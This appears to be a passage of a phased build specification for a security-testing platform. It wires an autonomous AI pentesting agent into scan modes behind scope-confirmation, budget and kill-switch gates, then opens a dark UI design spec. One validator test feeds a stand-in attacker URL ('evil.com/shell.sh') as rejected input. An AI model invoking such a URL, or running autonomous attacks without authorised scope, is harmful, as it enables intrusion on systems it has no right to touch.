    dependencies=[Depends(get_current_user)]
  )

Generate organization.py only. Stop after.
```

---

### Step 12.3 — Orchestrator Mode Branching

```
PHASE 12 — STEP 3

Generate: str_replace additions to
backend/orchestrator/orchestrator.py

─────────────────────────────────────────

Modify start_scan() (str_replace):

After creating Scan record, add:
  # Store scan_mode on the Scan record
  scan.scan_mode = config.get("scan_mode", ScanMode.CLASSIC)
  await db.commit()
  
  # Log scan creation to AuditLog
  await audit_logger.log(
    action="scan_created",
    scan_id=scan.id,
    organization_id=scan.organization_id,
    phase="INIT",
    decision=f"scan_mode={scan.scan_mode}",
    reason="User initiated scan",
    db=db
  )

─────────────────────────────────────────

Modify on_enum_complete() (str_replace at the point
where it dispatches vuln + secrets tasks):

Replace existing dispatch logic with:

  scan = await db.get(Scan, event.scan_id)
  scan_mode = ScanMode(scan.scan_mode)
  
  if scan_mode == ScanMode.AUTONOMOUS:
    # AUTONOMOUS: skip classic Vuln/Secrets entirely
    Log: f"AUTONOMOUS mode: dispatching Strix as primary tester"
    
    await audit_logger.log(
      action="autonomous_mode_activated",
      scan_id=scan.id,
      phase="ORCHESTRATOR",
      decision="Skip classic Vuln+Secrets, run Strix deep",
      reason=(
        "Scan mode is AUTONOMOUS. Strix will perform "
        "comprehensive AI-driven vulnerability testing "
        "using the recon+enum context collected so far."
      ),
      db=db
    )
    
    # Mark Vuln + Secrets as vacuously complete
    # so on_all_phase_complete() fires correctly after Strix
    await redis.set(
      f"agentsec:vuln_complete:{event.scan_id}", "1",
      ex=86400
    )
    await redis.set(
      f"agentsec:secrets_complete:{event.scan_id}", "1",
      ex=86400
    )
    
    # Dispatch Strix with deep mode + all context
    context_dict = await _build_context_dict_for_strix(
      scan, event, strix_scan_mode="deep"
    )
    context_dict["strix_requested"] = True
    
    celery_app.send_task(
      "strix.start",
      args=[str(scan.id), context_dict],
      queue="strix_queue"
    )
    
    Update Scan.current_phase = "Autonomous AI Testing"
    Update Scan.progress = 22
    Publish WebSocket: {
      type: "phase_started",
      phase: "autonomous",
      message: "Strix autonomous agent starting deep scan..."
    }
    
    Return  # Don't dispatch anything else
  
  elif scan_mode == ScanMode.HYBRID:
    # HYBRID: run classic pipeline first, Strix may follow
    Log: "HYBRID mode: running classic pipeline first"
    
    # Dispatch classic Vuln + Secrets exactly as before
    ... existing dispatch logic unchanged ...
    
    # Pass scan_mode through context so VulnAgent's
    # decision logic knows to check for Strix
    context_dict["scan_mode"] = "HYBRID"
  
  else:
    # CLASSIC: existing logic completely unchanged
    ... existing dispatch logic unchanged ...

─────────────────────────────────────────

_build_context_dict_for_strix(scan, event,
    strix_scan_mode) → async → dict:

  Load ScanContext from Redis
  Also load any existing instruction from scan.scan_config
  
  return {
    "strix_scan_mode": strix_scan_mode,
    "strix_instruction": (
      scan.scan_config or {}
    ).get("strix_instruction", ""),
    # Pass enum context so Strix doesn't re-discover
    "subdomain_count": event.live_host_count,
    "has_graphql": context.has_graphql,
    "has_api_endpoints": context.has_api_endpoints,
    "endpoint_count": context.endpoint_count,
    **json.loads(
      await redis.get(f"agentsec:context:{scan.id}") or "{}"
    )
  }

Generate additions only. Stop after.
```

---

### Step 12.4 — Scan API Validation

```
PHASE 12 — STEP 4

Generate: str_replace to backend/api/scans.py

Modify the POST / (create scan) endpoint:

After the existing target validation, add:

  # ── Scan mode validation ──────────────────────────────
  scan_mode = request.scan_mode or ScanMode.CLASSIC
  
  If scan_mode in [ScanMode.HYBRID, ScanMode.AUTONOMOUS]:
    
    # Gate 1: Strix must be enabled
    If not settings.strix.enabled:
      raise HTTPException(
        status_code=403,
        detail={
          "code": "STRIX_DISABLED",
          "message": (
            f"{scan_mode.value.title()} scan mode requires "
            "AI agent capabilities which are disabled on this "
            "deployment. Set STRIX_AGENT_ENABLED=True in .env."
          )
        }
      )
    
    # Gate 2: Org must have confirmed scope
    org = await db.get(Organization, current_user.organization_id)
    If not org or not org.authorized_scope_confirmed:
      raise HTTPException(
        status_code=403,
        detail={
          "code": "SCOPE_NOT_CONFIRMED",
          "message": (
            f"{scan_mode.value.title()} scan mode requires "
            "your organization to confirm authorized testing scope. "
            "POST to /api/v1/organizations/{org_id}/"
            "confirm-authorized-scope first."
          ),
          "confirm_url": (
            f"/api/v1/organizations/"
            f"{current_user.organization_id}/"
            "confirm-authorized-scope"
          ),
          "required_statement": REQUIRED_SCOPE_STATEMENT
        }
      )
  
  # Store scan_mode in scan config for orchestrator
  scan_config = request.config.dict() if request.config else {}
  scan_config["scan_mode"] = scan_mode.value
  If request.strix_instruction:
    scan_config["strix_instruction"] = request.strix_instruction
  
  # Continue with existing scan creation logic...

Also update Scan creation to set scan.scan_mode = scan_mode

Generate str_replace additions only. Stop after.
```

---

### Step 12.5 — Strix Event Handlers in Orchestrator

```
PHASE 12 — STEP 5

Generate: str_replace additions to
backend/orchestrator/orchestrator.py

Add new event handler method:

on_strix_complete(event: StrixCompleteEvent) → async:

  """
  Handles Strix completion in AUTONOMOUS mode.
  In HYBRID mode, Strix completes inside vuln agent flow
  and vuln_complete flag is already set — no extra handler.
  In AUTONOMOUS mode, Strix IS the vuln phase.
  """
  
  scan = await db.get(Scan, event.scan_id)
  
  # Update scan with Strix results
  scan.strix_cost_usd = event.cost_usd
  scan.strix_status = event.status
  await db.commit()
  
  # Log to AuditLog
  await audit_logger.log(
    action="strix_orchestrator_complete",
    scan_id=UUID(event.scan_id),
    phase="ORCHESTRATOR",
    decision=(
      f"Strix completed with status={event.status}, "
      f"findings={event.finding_count}, "
      f"cost=${event.cost_usd:.4f}"
    ),
    severity="INFO",
    db=db
  )
  
  # Publish WebSocket
  await event_bus.publish_to_websocket(
    event.scan_id,
    {
      "type": "strix_complete",
      "finding_count": event.finding_count,
      "cost_usd": event.cost_usd,
      "status": event.status
    }
  )
  
  # In AUTONOMOUS mode the vuln flag was set when
  # we dispatched Strix (in on_enum_complete).
  # Check if secrets is also done (secrets was also
  # pre-flagged in AUTONOMOUS mode).
  # Both should already be set — call on_all_phase_complete
  vuln_done = await redis.get(
    f"agentsec:vuln_complete:{event.scan_id}"
  )
  secrets_done = await redis.get(
    f"agentsec:secrets_complete:{event.scan_id}"
  )
  
  If vuln_done and secrets_done:
    await on_all_phase_complete(event.scan_id)

─────────────────────────────────────────

Also modify the Vuln Agent (str_replace in
backend/workers/vuln_agent.py):

In _async_start_vuln(), after running all tool modules
but BEFORE firing VulnScanCompleteEvent, add:

  # In HYBRID mode, check if Strix should also run
  scan_mode = context_dict.get("scan_mode", "CLASSIC")
  
  If scan_mode == "HYBRID" and settings.strix.enabled:
    decision = decision_engine.decide_strix_invocation(
      context=context,
      vuln_findings_so_far=[f.to_dict() for f in all_findings],
      scan_mode="HYBRID"
    )
    
    If decision is not None:
      Log: f"HYBRID mode: dispatching Strix — {decision.reason}"
      
      await audit_logger.log(
        action="strix_dispatched_by_decision_engine",
        scan_id=UUID(scan_id),
        phase="VULN",
        decision="Dispatch Strix for hybrid validation",
        reason=decision.reason,
        db=db
      )
      
      context_dict["strix_scan_mode"] = (
        decision.input_params.get("strix_scan_mode", "standard")
      )
      If decision.input_params.get("strix_instruction"):
        context_dict["strix_instruction"] = (
          decision.input_params["strix_instruction"]
        )
      
      celery_app.send_task(
        "strix.start",
        args=[scan_id, context_dict],
        queue="strix_queue"
      )
      
      Publish WebSocket: {
        type: "strix_starting",
        reason: decision.reason,
        mode: "hybrid_validation"
      }
    
    Else:
      Log: "HYBRID: Decision engine found no Strix signal"
      # Strix not needed — set strix_complete flag so
      # orchestrator isn't stuck waiting
      await redis.set(
        f"agentsec:strix_complete:{scan_id}", "1", ex=86400
      )

Generate additions only. Stop after.
```

---

### Step 12.6 — Report Merge

```
PHASE 12 — STEP 6

Generate str_replace additions to:
  backend/workers/processors/finding_aggregator.py
  backend/reports/templates/report.html
  backend/reports/templates/styles.css
  backend/reports/pdf_builder.py

─────────────────────────────────────────

finding_aggregator.py additions:

In build() method, after loading all findings:

  # Compute is_ai_validated flag for each finding
  for finding in findings:
    finding.is_ai_validated = (
      finding.tool_found_by == "strix" or
      (finding.evidence and
       "CORROBORATED BY STRIX" in finding.evidence)
    )

In ScanStatistics dataclass, add:
  scan_mode: str
  strix_cost_usd: float | None
  strix_findings_count: int
  strix_status: str | None

In build() → generate_enum_report_section(), add:
  scan_mode = scan.scan_mode
  strix_findings_count = len([
    f for f in findings
    if f.tool_found_by == "strix"
  ])

─────────────────────────────────────────

report.html str_replace:

1. In the finding-card block, after the CVSS badge span,
   add:

{% if finding.is_ai_validated %}
<span class="ai-validated-badge">
  🤖 AI-Validated (Strix)
</span>
{% endif %}

2. After the "5. Vulnerability Findings" h2, add:

{% if report.scan.scan_mode != "CLASSIC" %}
<div class="scan-mode-notice">
  {% if report.scan.scan_mode == "AUTONOMOUS" %}
  <div class="mode-icon">🤖</div>
  <div class="mode-text">
    <strong>Autonomous AI Scan</strong>
    This assessment used AgentSec AI's Autonomous mode.
    Vulnerabilities were identified by Strix, an
    autonomous AI pentesting agent that operated within
    a defined scope, cost budget
    (${{ report.statistics.strix_cost_usd | round(4) or "N/A" }}),
    and turn limit. Every finding includes a working
    proof-of-concept generated during live testing.
    Total Strix findings: {{ report.statistics.strix_findings_count }}.
  </div>
  {% elif report.scan.scan_mode == "HYBRID" %}
  <div class="mode-icon">🔀</div>
  <div class="mode-text">
    <strong>Hybrid AI + Rule-Based Scan</strong>
    This assessment combined AgentSec AI's rule-based
    scanning pipeline with targeted Strix AI-agent
    validation on complex findings requiring deeper
    analysis.
    {% if report.statistics.strix_findings_count > 0 %}
    Strix contributed {{ report.statistics.strix_findings_count }}
    finding(s). Findings with the 🤖 badge were discovered
    or validated by the AI agent with working PoC evidence.
    {% else %}
    The AI agent found no additional findings beyond the
    rule-based scan.
    {% endif %}
  </div>
  {% endif %}
</div>
{% endif %}

3. In the Scan Statistics table (Section 8), add:

<tr>
  <td>Scan Mode</td>
  <td>
    {{ report.scan.scan_mode }}
    {% if report.scan.scan_mode != "CLASSIC" %}
    (AI Agent: Strix)
    {% endif %}
  </td>
</tr>

{% if report.statistics.strix_cost_usd %}
<tr>
  <td>AI Agent Cost</td>
  <td>${{ report.statistics.strix_cost_usd | round(4) }}</td>
</tr>
{% endif %}

{% if report.statistics.strix_findings_count %}
<tr>
  <td>AI-Validated Findings</td>
  <td>{{ report.statistics.strix_findings_count }}</td>
</tr>
{% endif %}

─────────────────────────────────────────

styles.css additions:

.ai-validated-badge {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  background: linear-gradient(135deg, #EEF2FF, #F5F3FF);
  color: #4338CA;
  border: 1px solid #C4B5FD;
  border-radius: 12px;
  padding: 3px 10px;
  font-size: 9px;
  font-weight: 700;
  margin-left: 8px;
  letter-spacing: 0.3px;
}

.scan-mode-notice {
  display: flex;
  align-items: flex-start;
  gap: 12px;
  background: linear-gradient(135deg, #F5F3FF, #EDE9FE);
  border: 1px solid #C4B5FD;
  border-left: 4px solid #7C3AED;
  border-radius: 8px;
  padding: 14px 16px;
  margin-bottom: 20px;
  page-break-inside: avoid;
}

.scan-mode-notice .mode-icon {
  font-size: 22px;
  flex-shrink: 0;
  margin-top: 2px;
}

.scan-mode-notice .mode-text {
  font-size: 10px;
  line-height: 1.5;
  color: #3730A3;
}

.scan-mode-notice strong {
  display: block;
  font-size: 11px;
  margin-bottom: 4px;
  color: #1E1B4B;
}

Generate additions only. Stop after.
```

---

### Step 12.7 — CI/CD Endpoint

```
PHASE 12 — STEP 7

Generate: backend/api/ci.py

This is a SEPARATE code path for scanning source
repositories from CI/CD pipelines. Not the same as
live-target scanning. No Scan/Subdomain/Host models.

router = APIRouter()

─────────────────────────────────────────

CIJobStatus Enum:
  QUEUED = "queued"
  RUNNING = "running"
  COMPLETED = "completed"
  FAILED = "failed"

CIScanRequest schema:
  repo_url: str
    (GitHub/GitLab URL or local path — validated as
     git URL or relative path, not a network target)
  diff_base: str | None = None (e.g. "origin/main")
  scope_mode: str = "auto"  # auto | diff | full
  scan_mode: str = "quick"  # quick | standard

CIScanResponse schema:
  job_id: str
  status: CIJobStatus
  message: str
  poll_url: str

CIJobResult schema:
  job_id: str
  status: CIJobStatus
  vulnerabilities_found: bool
  findings_count: int
  cost_usd: float | None
  strix_status: str | None
  report_url: str | None
  findings: list[dict]

─────────────────────────────────────────

POST /ci/scan-repo:

  Auth: API key (X-API-Key header, NOT JWT)
    Use existing API key auth middleware from Phase 10
  
  Logic:
    STEP 1: Same gates as strix agent
      STRIX_AGENT_ENABLED check
      org.authorized_scope_confirmed check
    
    STEP 2: Validate repo_url
      Must match pattern:
        https://github.com/... OR
        https://gitlab.com/... OR
        relative path (no absolute /etc, no http to domains)
      Not a live network target (different from scan validator)
    
    STEP 3: Generate job_id
      job_id = f"ci-{uuid4().hex[:12]}"
    
    STEP 4: Store job in Redis
      redis.set(
        f"agentsec:ci_job:{job_id}",
        json.dumps({
          "status": "queued",
          "repo_url": request.repo_url,
          "diff_base": request.diff_base,
          "scope_mode": request.scope_mode,
          "scan_mode": request.scan_mode,
          "created_at": datetime.utcnow().isoformat(),
          "user_id": str(current_user.id)
        }),
        ex=86400
      )
    
    STEP 5: Dispatch CI Strix task
      Build Strix CLI command for repo scan:
        cmd includes:
          --target {repo_url}
          --non-interactive
          --scan-mode {scan_mode}
          --max-budget {STRIX_CI_MAX_BUDGET_USD, default 5}
          --max-turns {STRIX_MAX_TURNS}
          --run-name {job_id}
          If diff_base: add --diff-base {diff_base}
          If scope_mode != "auto": add --scope-mode {scope_mode}
      
      Dispatch to strix_queue Celery task:
        strix_ci_scan.delay(
          job_id=job_id,
          repo_url=request.repo_url,
          cmd_args=cmd
        )
    
    Return CIScanResponse(
      job_id=job_id,
      status=CIJobStatus.QUEUED,
      message="CI scan queued",
      poll_url=f"/api/v1/ci/scan-repo/{job_id}"
    )

─────────────────────────────────────────

GET /ci/scan-repo/{job_id}:

  Auth: API key
  
  Logic:
    Load job from Redis:
      data = redis.get(f"agentsec:ci_job:{job_id}")
      If not data: 404
      job = json.loads(data)
    
    If job["status"] in ("queued", "running"):
      Return CIJobResult(
        job_id=job_id,
        status=job["status"],
        vulnerabilities_found=False,
        findings_count=0,
        cost_usd=None,
        strix_status=None,
        report_url=None,
        findings=[]
      )
    
    If job["status"] == "completed":
      # Read Strix output from run directory
      run_dir = Path(settings.strix.runs_base_dir) / \
                "strix_runs" / job_id
      
      vuln_json = run_dir / "vulnerabilities.json"
      findings = []
      If vuln_json.exists():
        findings = json.loads(vuln_json.read_text())
      
      run_json = json.loads(
        (run_dir / "run.json").read_text()
      ) if (run_dir / "run.json").exists() else {}
      
      cost_usd = _extract_cost_from_run_json(run_json)
      
      # CI-specific exit code semantics:
      # vulnerabilities_found == True means CI job SHOULD fail
      vulnerabilities_found = len(findings) > 0
      
      report_url = (
        f"/api/v1/ci/scan-repo/{job_id}/report"
        if (run_dir / "penetration_test_report.md").exists()
        else None
      )
      
      Return CIJobResult(
        job_id=job_id,
        status=CIJobStatus.COMPLETED,
        vulnerabilities_found=vulnerabilities_found,
        findings_count=len(findings),
        cost_usd=cost_usd,
        strix_status=run_json.get("status"),
        report_url=report_url,
        findings=findings  # Full findings list
      )

─────────────────────────────────────────

GET /ci/scan-repo/{job_id}/report:
  Returns raw penetration_test_report.md content
  as text/markdown for CI pipeline consumption.

─────────────────────────────────────────

@celery_app.task(
  bind=True,
  name="strix.ci_scan",
  queue="strix_queue",
  max_retries=0  # Never retry CI scan — same rule as live
)
def strix_ci_scan(self, job_id: str,
                  repo_url: str,
                  cmd_args: list) → None:
  """Runs Strix against a repo for CI/CD scanning."""
  
  # Update job status to running
  Update Redis job status to "running"
  
  Try:
    # Execute Strix CLI
    result = subprocess.run(
      cmd_args,
      capture_output=True,
      text=True,
      timeout=settings.strix.timeout_seconds,
      env={**os.environ,
           "STRIX_LLM": settings.strix.llm_model,
           "LLM_API_KEY": settings.ANTHROPIC_API_KEY}
    )
    
    # Exit code 2 means vulns found — that's a success for us
    status = "completed" if result.returncode in (0, 2) else "failed"
    
    Update Redis job status to status
    Add cost data from run.json to Redis job
  
  Except:
    Update Redis job status to "failed"
    Log error

Also add CI router to app_factory.py:
  app.include_router(
    ci_router,
    prefix="/api/v1/ci",
    tags=["CI/CD"]
  )

Generate ci.py only. Stop after.
```

---

### Step 12.8 — Frontend Additions

```
PHASE 12 — STEP 8

Generate str_replace additions to:
  src/pages/scans/ScanDashboard.jsx
  src/pages/scans/LiveProgressDashboard.jsx
  src/pages/findings/VulnerabilityDashboard.jsx
  src/components/shared/ScanModeBadge.jsx (new file)

─────────────────────────────────────────

NEW: src/components/shared/ScanModeBadge.jsx:

Props: mode ("CLASSIC" | "HYBRID" | "AUTONOMOUS")

Renders a badge with:
  CLASSIC: gray pill "CLASSIC"
  HYBRID: purple pill "🔀 HYBRID"
  AUTONOMOUS: deep purple pill "🤖 AUTONOMOUS"

─────────────────────────────────────────

ScanDashboard.jsx str_replace — NewScanModal additions:

After the scan_type selector, add scan mode selector:

Scan Mode:
  Radio group or styled tab selector:
  
  ┌──────────────────────────────────────┐
  │ ○ CLASSIC (Default)                  │
  │   Fast, deterministic, no AI cost    │
  │                                      │
  │ ○ HYBRID                             │
  │   Classic + AI validation when needed│
  │   Requires: org scope confirmation   │
  │                                      │
  │ ○ AUTONOMOUS                         │
  │   AI agent as primary tester         │
  │   Requires: org scope confirmation   │
  └──────────────────────────────────────┘

If HYBRID or AUTONOMOUS selected:
  Show orange warning box:
    "⚠️ AI Agent Mode requires your organization to
     confirm authorized testing scope. Ensure all targets
     you submit are systems you own or have written
     authorization to test."
  
  If org.authorized_scope_confirmed == false:
    Show red error:
      "Your organization has not confirmed authorized
       scope. Click here to confirm before proceeding."
    Disable submit button

If HYBRID or AUTONOMOUS:
  Show optional strix_instruction textarea:
    "Custom AI Instructions (optional)"
    Placeholder: "e.g. Focus on IDOR and auth bypass.
                  Credentials: user@example.com:pass123"
    Max 1000 chars, show counter

─────────────────────────────────────────

LiveProgressDashboard.jsx str_replace additions:

In the TOP BAR, after scan ID:
  <ScanModeBadge mode={scan.scan_mode} />

New panel (only if scan_mode != CLASSIC):
  "🤖 Strix AI Agent" section
  Shows when scan_mode is HYBRID or AUTONOMOUS:
  
  If strix not started yet:
    Gray card: "Strix AI agent will activate after
                rule-based scan completes"
  
  If strix running (from WebSocket strix_starting event):
    Blue pulsing card:
      "🤖 Strix Autonomous Agent Running"
      Instruction preview (first 100 chars)
      Budget: $X.XX used / $Y.YY limit
      Mode: {scan_mode}
      Note: "This may take 15-60 minutes"
  
  If strix complete (from WebSocket strix_complete event):
    Green card:
      "✅ Strix AI Agent Complete"
      Findings: N
      Cost: ${cost_usd}
      Status: {status}

─────────────────────────────────────────

VulnerabilityDashboard.jsx str_replace additions:

In the findings table Severity column, after SeverityBadge:
  If finding.tool_found_by == "strix":
    <span className="ai-validated-tag">🤖 AI</span>

In FindingDetailModal, in the Overview tab:
  After tool badge, if tool_found_by == "strix":
    Show purple card:
      "🤖 AI-Validated Finding"
      "This vulnerability was discovered and validated
       by Strix, an autonomous AI pentesting agent.
       A working proof-of-concept was generated during
       live testing."

Add filter toggle above findings table:
  "AI-Validated only" toggle
  When enabled: filters to only strix findings

─────────────────────────────────────────

Also add to AnalyticsDashboard.jsx:

New stat card: "AI Agent Spend"
  Total strix_cost_usd across all scans
  Trend: cost per scan over time (line chart)

Generate all frontend additions. Stop after.
```

---

### Step 12.9 — Phase 12 Verification

```
PHASE 12 — STEP 9 — FINAL VERIFICATION

Write: tests/test_scan_modes.py

─────────────────────────────────────────

class TestScanModeAPI:

test_classic_never_touches_strix(
  api_client, auth_headers, mock_celery):
  
  POST /api/v1/scans
  body: {"target": "example.com", "scan_mode": "classic"}
  Assert: 200
  
  From mock_celery capture dispatched task names
  Assert: "strix.start" NOT in dispatched_tasks

test_hybrid_requires_org_consent(api_client, auth_headers):
  org.authorized_scope_confirmed = False
  POST /api/v1/scans body: {"scan_mode": "hybrid", ...}
  Assert: 403
  Assert: "SCOPE_NOT_CONFIRMED" in response.json()["detail"]["code"]

test_autonomous_requires_org_consent(api_client, auth_headers):
  org.authorized_scope_confirmed = False
  POST /api/v1/scans body: {"scan_mode": "autonomous", ...}
  Assert: 403

test_hybrid_requires_strix_enabled(api_client, auth_headers):
  org.authorized_scope_confirmed = True
  settings.strix.enabled = False
  POST /api/v1/scans body: {"scan_mode": "hybrid", ...}
  Assert: 403
  Assert: "STRIX_DISABLED" in response.json()["detail"]["code"]

test_confirm_scope_exact_statement(api_client, auth_headers):
  POST /api/v1/organizations/{id}/confirm-authorized-scope
  body: {
    "confirmation_statement": "wrong statement",
    "signed_by": "Test"
  }
  Assert: 400
  Assert: "STATEMENT_MISMATCH" in detail

test_confirm_scope_success(api_client, auth_headers):
  from backend.api.schemas import REQUIRED_SCOPE_STATEMENT
  POST /api/v1/organizations/{id}/confirm-authorized-scope
  body: {
    "confirmation_statement": REQUIRED_SCOPE_STATEMENT,
    "signed_by": "Security Team"
  }
  Assert: 200
  Assert: response["confirmed"] == True
  
  Reload org from DB
  Assert: org.authorized_scope_confirmed == True
  Assert: org.scope_confirmed_by == "Security Team"
  
  AuditLog has "org_scope_confirmed" entry

─────────────────────────────────────────

class TestOrchestratorModes:

test_autonomous_skips_vuln_agent(
  mock_celery, db_session, monkeypatch):
  
  scan.scan_mode = ScanMode.AUTONOMOUS
  
  Run orchestrator.on_enum_complete(mock_event)
  
  Dispatched tasks = [t.name for t in mock_celery.tasks]
  Assert: "vuln.start" NOT in dispatched_tasks
  Assert: "secrets.start" NOT in dispatched_tasks
  Assert: "strix.start" in dispatched_tasks
  
  # Vuln + secrets flags must be pre-set
  vuln_flag = await redis.get(
    f"agentsec:vuln_complete:{scan.id}"
  )
  Assert: vuln_flag == b"1"

test_autonomous_strix_gets_deep_mode(mock_celery, db_session):
  scan.scan_mode = ScanMode.AUTONOMOUS
  Run orchestrator.on_enum_complete(mock_event)
  
  strix_task = next(
    t for t in mock_celery.tasks if t.name == "strix.start"
  )
  context_dict = strix_task.args[1]
  Assert: context_dict["strix_scan_mode"] == "deep"

test_classic_unchanged_behavior(mock_celery, db_session):
  scan.scan_mode = ScanMode.CLASSIC
  Run orchestrator.on_enum_complete(mock_event)
  
  dispatched = [t.name for t in mock_celery.tasks]
  Assert: "vuln.start" in dispatched
  Assert: "secrets.start" in dispatched
  Assert: "strix.start" NOT in dispatched

─────────────────────────────────────────

class TestReportMerge:

test_ai_validated_badge_in_html(
  mock_claude_api, db_session, completed_scan):
  
  # Create one Strix finding
  strix_finding = FindingFactory(
    tool_found_by="strix",
    scan_id=completed_scan.id
  )
  
  # Build report
  aggregator = FindingAggregator(db_session)
  report_data = await aggregator.build(completed_scan.id)
  
  # Render template
  from backend.reports.pdf_builder import PDFBuilder
  pdf_builder = PDFBuilder()
  html = pdf_builder._render_html(full_report)
  
  Assert: "AI-Validated (Strix)" in html
  Assert: "ai-validated-badge" in html

test_scan_mode_notice_only_for_non_classic():
  # Classic scan
  report.scan.scan_mode = "CLASSIC"
  html = render_template(report)
  Assert: "scan-mode-notice" NOT in html
  
  # Hybrid scan
  report.scan.scan_mode = "HYBRID"
  html = render_template(report)
  Assert: "Hybrid AI + Rule-Based Scan" in html
  
  # Autonomous scan
  report.scan.scan_mode = "AUTONOMOUS"
  html = render_template(report)
  Assert: "Autonomous AI Scan" in html

test_strix_cost_in_statistics():
  report.scan.scan_mode = "HYBRID"
  report.statistics.strix_cost_usd = 1.2345
  html = render_template(report)
  Assert: "1.2345" in html or "1.234" in html

─────────────────────────────────────────

class TestCIEndpoint:

test_ci_endpoint_requires_api_key(api_client):
  POST /api/v1/ci/scan-repo WITHOUT X-API-Key
  Assert: 401

test_ci_endpoint_validates_repo_url(api_client, api_key_headers):
  POST with repo_url="https://evil.com/shell.sh"
  Assert: 400 or 422 (not a git repo URL)

test_ci_scan_queues_job(api_client, api_key_headers,
                         mock_celery):
  org.authorized_scope_confirmed = True
  settings.strix.enabled = True
  
  POST /api/v1/ci/scan-repo
  body: {
    "repo_url": "https://github.com/test/repo",
    "scan_mode": "quick"
  }
  Assert: 200
  Assert: "job_id" in response
  Assert: response["status"] == "queued"
  Assert: "strix.ci_scan" in mock_celery dispatched tasks

test_ci_poll_returns_status(api_client, api_key_headers):
  Create Redis job with status="running"
  GET /api/v1/ci/scan-repo/{job_id}
  Assert: response["status"] == "running"
  Assert: "vulnerabilities_found" in response

test_ci_vulnerabilities_found_flag(api_client, api_key_headers):
  Create Redis job with status="completed"
  Mock run directory with 2 vulnerabilities in json
  GET /api/v1/ci/scan-repo/{job_id}
  Assert: response["vulnerabilities_found"] == True
  Assert: response["findings_count"] == 2

─────────────────────────────────────────

Run: pytest tests/test_scan_modes.py -v
All tests must pass. Phase 12 complete when all pass.

─────────────────────────────────────────

Manual E2E verification checklist:

SETUP:
□ docker run -d -p 8080:80 vulnerables/web-dvwa
□ STRIX_AGENT_ENABLED=True in .env
□ STRIX_MAX_BUDGET_USD=2.00 (small for testing)
□ STRIX_MAX_TURNS=50
□ STRIX_DEFAULT_SCAN_MODE=quick

CLASSIC MODE TEST:
□ Create scan against localhost:8080
  scan_mode = "classic"
□ Verify: no strix.start task dispatched (Flower UI)
□ Verify: PDF report has no "AI-Validated" badges
□ Verify: report.scan.scan_mode = "CLASSIC"

HYBRID MODE TEST:
□ Confirm scope via org endpoint
□ Create scan against localhost:8080
  scan_mode = "hybrid"
□ Verify: vuln.start dispatched first (Flower)
□ If decision engine triggered Strix:
  □ Verify: strix.start dispatched after vuln
  □ Verify: AuditLog has strix_run_started
  □ Verify: strix_runs/ dir created with output
□ PDF has Hybrid mode notice section
□ Strix findings show 🤖 badge in dashboard

AUTONOMOUS MODE TEST:
□ Create scan with scan_mode = "autonomous"
□ Verify: NO vuln.start dispatched (Flower)
□ Verify: NO secrets.start dispatched
□ Verify: strix.start dispatched immediately after enum
□ Verify: Strix runs with --scan-mode deep flag
□ PDF has Autonomous mode notice + cost info

CI ENDPOINT TEST:
□ GET /api/v1/ci/scan-repo/{job_id} returns correct schema
□ vulnerabilities_found flag matches finding count

REPORT DIFF:
□ Generate all 3 mode PDFs
□ Classic PDF: no AI badges, no mode notice
□ Hybrid PDF: mode notice + potential AI badges
□ Autonomous PDF: all findings have AI badges + cost shown
```

---

## Phase 11 + 12 Complete Summary

| Phase | Steps | Key Files | Status |
|---|---|---|---|
| Phase 11 | 11.1 → 11.8 | strix_plugin.py, strix_agent.py, decision_engine (ext), strix_normalizer.py, audit_log.py, Dockerfile.strix, docker-compose (strix_worker) | 4-gate safety, black-box plugin, corroboration deduplication |
| Phase 12 | 12.1 → 12.9 | schemas (ScanMode), organization.py (scope confirm), orchestrator (mode branching), report.html (AI badges), ci.py (repo scan) | 3-mode selection, report merge, CI/CD wiring |

---

## Non-Negotiable Rules for Phase 11-12

```
1. STRIX_AGENT_ENABLED = False by default. Always.
   Same pattern as EXPLOIT_AGENT_ENABLED in Phase 8.

2. max_retries = 0 on ALL Strix Celery tasks.
   No automatic retries ever. Budget protection.

3. Every Strix run carries --non-interactive,
   --max-budget, --max-turns. No exceptions.

4. HYBRID and AUTONOMOUS require BOTH:
   - STRIX_AGENT_ENABLED=True
   - org.authorized_scope_confirmed=True (legal statement)

5. Never import from tools/strix-main/strix/ in production.
   tools/ is READ-ONLY reference. Call the CLI only.

6. Strix failure NEVER marks Scan.status = FAILED.
   One tool failing = that tool's findings missing.
   The rest of the pipeline continues and reports.

7. Test only against: scanme.nmap.org or local DVWA.
   STRIX_MAX_BUDGET_USD=2.00 while first validating.
```

# PHASE 13 — PREMIUM DESIGN SYSTEM (Breach/Siege Aesthetic)

---

### Step 13.0 — Phase 13 Master Context

```
PHASE 13 — PREMIUM DESIGN SYSTEM

Phases 0-12 complete. Platform is fully functional.
Now replacing the functional UI with an aggressive,
dark, "security incident" design system.

DESIGN PHILOSOPHY:
Think a live breach console, not a SaaS dashboard.
This is the screen a SOC analyst stares at during an
active incident. Stark. Loud where it needs to be loud
(alerts, critical states), dead silent everywhere else.
Two fused directions:

  "BLOOD BREACH" — the primary theme
    Crimson red (#E10600) as the ONLY accent color.
    Headline font: Oswald (condensed, industrial, all-caps).
    Background: matrix-rain style falling glyphs at 4-6%
    opacity behind hero/auth screens only — never on data
    screens where it would hurt readability.
    Occasional scan-bar "tear" — a horizontal glitch slice
    that displaces a thin strip of the screen for one frame,
    triggered on: page load, critical finding appearing,
    scan completing.

  "BLACKOUT SIEGE" — the alert-state variant
    True black + true white, no gray gradient in between
    for CRITICAL-severity contexts specifically.
    Headline font for emphasis states: Anton (ultra-bold,
    tightly tracked, built for shouting one word).
    Strobing flash-bar: a single full-width white bar that
    flashes at low opacity (never full-white-flash — this
    must never trigger photosensitivity issues) when a
    CRITICAL finding is confirmed, then settles.
    Scattered static lines: thin 1px horizontal lines,
    randomly spaced, very low opacity, sitting statically
    (not animated) as a texture layer on void backgrounds.

HOW THE TWO FUSE:
  Blood Breach is the resting state of the entire app —
  the crimson accent, Oswald headlines, matrix rain on
  auth/hero screens only.
  Blackout Siege is reserved ENTIRELY for CRITICAL-severity
  moments — a critical finding card, the critical stat
  number, the scan-complete screen if criticals exist.
  It never becomes the default theme; it's the app's way
  of visually screaming exactly once when it matters.

ACCESSIBILITY GUARDRAIL (non-negotiable):
  No flash may exceed 3 flashes per second (WCAG 2.3.1).
  The strobe effect is capped at ONE flash, ~150ms, low
  opacity (max 12% white overlay), never repeating in a
  loop. This is a signal, not a seizure risk. Respect
  prefers-reduced-motion by disabling ALL glitch/strobe/
  rain effects entirely when it's set — no exceptions.

REFERENCE AESTHETIC:
  Bloomberg Terminal's darkest mode + a breach notification
